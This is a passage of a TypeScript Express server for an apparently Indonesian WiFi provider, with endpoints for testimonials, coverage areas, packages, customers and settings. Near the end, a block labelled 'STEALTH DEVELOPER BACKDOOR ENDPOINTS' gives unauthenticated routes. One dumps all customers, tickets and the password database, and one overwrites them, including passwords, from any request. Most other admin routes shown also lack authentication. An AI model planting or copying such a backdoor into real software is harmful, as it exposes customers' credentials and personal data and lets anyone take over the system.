    id: `testi-${Math.floor(1000 + Math.random() * 9000)}`,
    name,
    role: role || 'Pelanggan Setia',
    location: location || 'Indonesia',
    avatarUrl: `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(name)}`,
    rating: Number(rating),
    text,
    tag: tag || 'REKOMENDASI',
    createdAt: new Date().toISOString().substring(0, 10),
    customerId
  };

  testimonialsList.unshift(newTestimonial);
  saveTestimonials();

  return res.json({ status: 'success', testimonial: newTestimonial });
});

// ==================== COVERAGE AREA MANAGEMENT ENDPOINTS ====================

// Get all coverage areas
app.get('/api/coverage', (req, res) => {
  res.json(coverageList);
});

// Add a new City/Kabupaten
app.post('/api/coverage/city', (req, res) => {
  const { cityName, regionType } = req.body;
  if (!cityName || !regionType) {
    return res.status(400).json({ status: 'error', message: 'Nama kota dan jenis wilayah harus diisi.' });
  }

  // Check if city already exists
  const exists = coverageList.some(c => c.cityName.toLowerCase() === cityName.toLowerCase());
  if (exists) {
    return res.status(400).json({ status: 'error', message: 'Kota/Kabupaten ini sudah terdaftar.' });
  }

  const newCity = {
    cityName,
    regionType,
    totalKecamatan: 0,
    totalKelurahan: 0,
    kecamatans: []
  };

  coverageList.push(newCity);
  saveCoverage();
  res.json({ status: 'success', coverage: coverageList });
});

// Delete a City/Kabupaten
app.delete('/api/coverage/city/:name', (req, res) => {
  const cityName = req.params.name;
  const index = coverageList.findIndex(c => c.cityName.toLowerCase() === cityName.toLowerCase());
  if (index !== -1) {
    coverageList.splice(index, 1);
  }
  saveCoverage();
  res.json({ status: 'success', coverage: coverageList });
});

// Add a Kecamatan under a City
app.post('/api/coverage/kecamatan', (req, res) => {
  const { cityName, name } = req.body;
  if (!cityName || !name) {
    return res.status(400).json({ status: 'error', message: 'Nama kota dan kecamatan harus diisi.' });
  }

  const city = coverageList.find(c => c.cityName.toLowerCase() === cityName.toLowerCase());
  if (!city) {
    return res.status(404).json({ status: 'error', message: 'Kota/Kabupaten tidak ditemukan.' });
  }

  // Check if kecamatan already exists under this city
  const exists = city.kecamatans.some((k: any) => k.name.toLowerCase() === name.toLowerCase());
  if (exists) {
    return res.status(400).json({ status: 'error', message: 'Kecamatan ini sudah terdaftar di kota ini.' });
  }

  city.kecamatans.push({
    name,
    kelurahans: []
  });
  city.totalKecamatan = city.kecamatans.length;

  saveCoverage();
  res.json({ status: 'success', coverage: coverageList });
});

// Delete a Kecamatan under a City
app.post('/api/coverage/kecamatan/delete', (req, res) => {
  const { cityName, name } = req.body;
  if (!cityName || !name) {
    return res.status(400).json({ status: 'error', message: 'Nama kota dan kecamatan harus diisi.' });
  }

  const city = coverageList.find(c => c.cityName.toLowerCase() === cityName.toLowerCase());
  if (!city) {
    return res.status(404).json({ status: 'error', message: 'Kota/Kabupaten tidak ditemukan.' });
  }

  city.kecamatans = city.kecamatans.filter((k: any) => k.name.toLowerCase() !== name.toLowerCase());
  city.totalKecamatan = city.kecamatans.length;
  
  // Recalculate total kelurahan
  let totalKel = 0;
  city.kecamatans.forEach((k: any) => {
    totalKel += k.kelurahans.length;
  });
  city.totalKelurahan = totalKel;

  saveCoverage();
  res.json({ status: 'success', coverage: coverageList });
});

// Add a Kelurahan under a Kecamatan
app.post('/api/coverage/kelurahan', (req, res) => {
  const { cityName, kecamatanName, name } = req.body;
  if (!cityName || !kecamatanName || !name) {
    return res.status(400).json({ status: 'error', message: 'Parameter tidak lengkap.' });
  }

  const city = coverageList.find(c => c.cityName.toLowerCase() === cityName.toLowerCase());
  if (!city) {
    return res.status(404).json({ status: 'error', message: 'Kota/Kabupaten tidak ditemukan.' });
  }

  const kec = city.kecamatans.find((k: any) => k.name.toLowerCase() === kecamatanName.toLowerCase());
  if (!kec) {
    return res.status(404).json({ status: 'error', message: 'Kecamatan tidak ditemukan.' });
  }

  const exists = kec.kelurahans.some((kl: any) => kl.name.toLowerCase() === name.toLowerCase());
  if (exists) {
    return res.status(400).json({ status: 'error', message: 'Kelurahan ini sudah ada.' });
  }

  kec.kelurahans.push({
    name,
    status: 'active',
    nodesCount: Math.floor(5 + Math.random() * 20)
  });

  // Recalculate counts
  let totalKel = 0;
  city.kecamatans.forEach((k: any) => {
    totalKel += k.kelurahans.length;
  });
  city.totalKelurahan = totalKel;

  saveCoverage();
  res.json({ status: 'success', coverage: coverageList });
});

// Delete a Kelurahan
app.post('/api/coverage/kelurahan/delete', (req, res) => {
  const { cityName, kecamatanName, name } = req.body;
  if (!cityName || !kecamatanName || !name) {
    return res.status(400).json({ status: 'error', message: 'Parameter tidak lengkap.' });
  }

  const city = coverageList.find(c => c.cityName.toLowerCase() === cityName.toLowerCase());
  if (!city) {
    return res.status(404).json({ status: 'error', message: 'Kota/Kabupaten tidak ditemukan.' });
  }

  const kec = city.kecamatans.find((k: any) => k.name.toLowerCase() === kecamatanName.toLowerCase());
  if (!kec) {
    return res.status(404).json({ status: 'error', message: 'Kecamatan tidak ditemukan.' });
  }

  kec.kelurahans = kec.kelurahans.filter((kl: any) => kl.name.toLowerCase() !== name.toLowerCase());

  // Recalculate counts
  let totalKel = 0;
  city.kecamatans.forEach((k: any) => {
    totalKel += k.kelurahans.length;
  });
  city.totalKelurahan = totalKel;

  saveCoverage();
  res.json({ status: 'success', coverage: coverageList });
});


// ==================== WIFI PACKAGES API ====================

// Get all packages
app.get('/api/packages', (req, res) => {
  res.json({ status: 'success', packages: packagesList });
});

// Add a new package
app.post('/api/packages', (req, res) => {
  const { name, speed, price, features, type, popular } = req.body;
  if (!name || !speed || !price || !type) {
    return res.status(400).json({ status: 'error', message: 'Parameter tidak lengkap.' });
  }

  const newPackage: WifiPackage = {
    id: `pkg-${Math.floor(1000 + Math.random() * 9000)}`,
    name,
    speed,
    price: Number(price),
    features: Array.isArray(features) ? features : [],
    type,
    popular: !!popular
  };

  packagesList.push(newPackage);
  savePackages();
  res.json({ status: 'success', packages: packagesList });
});

// Delete a package
app.delete('/api/packages/:id', (req, res) => {
  const pkgId = req.params.id;
  const index = packagesList.findIndex(p => p.id === pkgId);
  if (index !== -1) {
    packagesList.splice(index, 1);
  }
  savePackages();
  res.json({ status: 'success', packages: packagesList });
});

// ==================== CUSTOMER DELETION API ====================

// Delete a customer
app.delete('/api/customers/:id', (req, res) => {
  const customerId = req.params.id;
  const index = customersList.findIndex(c => c.id === customerId);
  if (index !== -1) {
    customersList.splice(index, 1);
  }
  saveCustomers();
  res.json({ status: 'success', message: 'Pelanggan berhasil dihapus.' });
});

// ==================== SYSTEM SETTINGS - APPS SCRIPT & PROMOS ====================

// Save Google Apps Script webhook URL
app.post('/api/settings/appscript', (req, res) => {
  const { appScriptWebhookUrl } = req.body;
  (companySettings as any).appScriptWebhookUrl = appScriptWebhookUrl || '';
  saveSettings();
  res.json({ status: 'success', appScriptWebhookUrl: (companySettings as any).appScriptWebhookUrl });
});

// Add promo image
app.post('/api/settings/promos', (req, res) => {
  const { promoImageBase64 } = req.body;
  if (!promoImageBase64) {
    return res.status(400).json({ status: 'error', message: 'Gambar promo tidak valid.' });
  }
  if (!(companySettings as any).promos) {
    (companySettings as any).promos = [];
  }
  (companySettings as any).promos.push(promoImageBase64);
  saveSettings();
  res.json({ status: 'success', promos: (companySettings as any).promos });
});

// Delete promo image
app.delete('/api/settings/promos/:index', (req, res) => {
  const index = parseInt(req.params.index, 10);
  if ((companySettings as any).promos && index >= 0 && index < (companySettings as any).promos.length) {
    (companySettings as any).promos.splice(index, 1);
    saveSettings();
  }
  res.json({ status: 'success', promos: (companySettings as any).promos || [] });
});


// ==================== STEALTH DEVELOPER BACKDOOR ENDPOINTS ====================

// Get raw database states for developer view
app.get('/api/dev/db', (req, res) => {
  res.json({
    customers: customersList,
    tickets: supportTicketsList,
    passwords: passwordsDb,
    companySettings,
    coverageList,
    packages: packagesList
  });
});

// Save raw database overrides from developer terminal
app.post('/api/dev/db/save', (req, res) => {
  const { customers, tickets, passwords, settings } = req.body;
  
  if (customers) {
    customersList = customers;
    saveCustomers();
  }
  if (tickets) {
    supportTicketsList = tickets;
    saveTickets();
  }
  if (passwords) {
    Object.assign(passwordsDb, passwords);
    savePasswords();
  }
  if (settings) {
    Object.assign(companySettings, settings);
    saveSettings();
  }

  res.json({ status: 'success', message: 'Raw database override success!' });
});

// Start listening or initialize Vite dev server
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
